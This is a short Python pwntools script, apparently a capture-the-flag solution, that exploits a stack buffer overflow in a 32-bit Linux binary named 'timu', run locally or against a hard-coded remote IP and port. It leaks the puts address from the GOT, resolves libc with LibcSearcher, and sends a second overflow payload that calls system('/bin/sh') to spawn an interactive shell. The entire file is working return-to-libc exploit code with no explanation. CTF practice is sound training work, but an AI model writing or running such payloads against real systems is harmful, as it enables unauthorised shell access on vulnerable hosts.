#!/usr/bin/env python
# -*- coding: utf-8 -*-
from LibcSearcher import *
from pwn import *

debug = 1
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./timu')
else:
    p = remote('183.129.189.60', 10003)
elf = ELF('./timu', checksec=False)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
addr_main = 0x080488D5

# gdb.attach(p, "b *0x80488cf\nc")
pd = '\x00' * 0x1e
pd += 'system'
pd = pd.ljust(0x3e, '\x00')
pd += p32(plt_puts)
pd += p32(addr_main)
pd += p32(got_puts)
p.sendafter('your input : ', pd)
p.recvuntil('Think about it \n')
addr_puts = int(u32(p.recv(4)))
libc = LibcSearcher('puts', addr_puts)
libcbase = addr_puts - libc.dump('puts')
addr_system = libcbase + libc.dump('system')
addr_bin_sh = libcbase + libc.dump('str_bin_sh')

pd = '\x00' * 0x1e
pd += 'system'
pd = pd.ljust(0x3e, '\x00')
pd += p32(addr_system)
pd += p32(addr_main)
pd += p32(addr_bin_sh)
p.sendafter('your input : ', pd)
success('addr_puts = ' + hex(addr_puts))
p.interactive()
